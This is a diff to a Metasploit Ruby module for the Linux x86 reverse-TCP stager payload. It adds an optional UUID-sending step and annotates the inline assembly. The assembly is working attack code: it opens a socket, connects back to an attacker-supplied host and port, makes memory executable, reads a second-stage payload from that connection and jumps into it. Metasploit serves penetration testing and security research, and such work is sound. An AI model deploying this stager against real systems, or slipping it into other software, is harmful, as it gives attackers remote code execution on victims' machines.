@@ -3,6 +3,7 @@
 require 'msf/core'
 require 'msf/core/payload/transport_config'
 require 'msf/core/payload/linux'
+require 'msf/core/payload/linux/send_uuid'
 
 module Msf
 
@@ -18,6 +19,7 @@ module Payload::Linux::ReverseTcp
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Linux
+  include Msf::Payload::Linux::SendUUID
 
   #
   # Generate the first stage
@@ -37,6 +39,14 @@ module Payload::Linux::ReverseTcp
     end
 
     generate_reverse_tcp(conf)
+  end
+
+  #
+  # By default, we don't want to send the UUID, but we'll send
+  # for certain payloads if requested.
+  #
+  def include_send_uuid
+    false
   end
 
   def transport_config(opts={})
@@ -89,9 +99,10 @@ module Payload::Linux::ReverseTcp
       push 0x2
       mov al, 0x66
       mov ecx, esp
-      int 0x80                   ; sys_socketcall
-      xchg eax, edi
-      pop ebx
+      int 0x80                   ; sys_socketcall (socket())
+
+      xchg eax, edi              ; store the socket in edi
+      pop ebx                    ; set ebx back to zero
       push #{encoded_host}
       push #{encoded_port}
       mov ecx, esp
@@ -102,7 +113,12 @@ module Payload::Linux::ReverseTcp
       push edi
       mov ecx, esp
       inc ebx
-      int 0x80                  ; sys_socketcall
+      int 0x80                  ; sys_socketcall (connect())
+    ^
+
+    asm << asm_send_uuid if include_send_uuid
+
+    asm << %Q^
       mov dl, 0x7
       mov ecx, 0x1000
       mov ebx, esp
@@ -110,12 +126,13 @@ module Payload::Linux::ReverseTcp
       shl ebx, 0xc
       mov al, 0x7d
       int 0x80                  ; sys_mprotect
+
       pop ebx
       mov ecx, esp
       cdq
       mov dh, 0xc
       mov al, 0x3
-      int 0x80                  ; sys_read
+      int 0x80                  ; sys_read (recv())
       jmp ecx
     ^
 
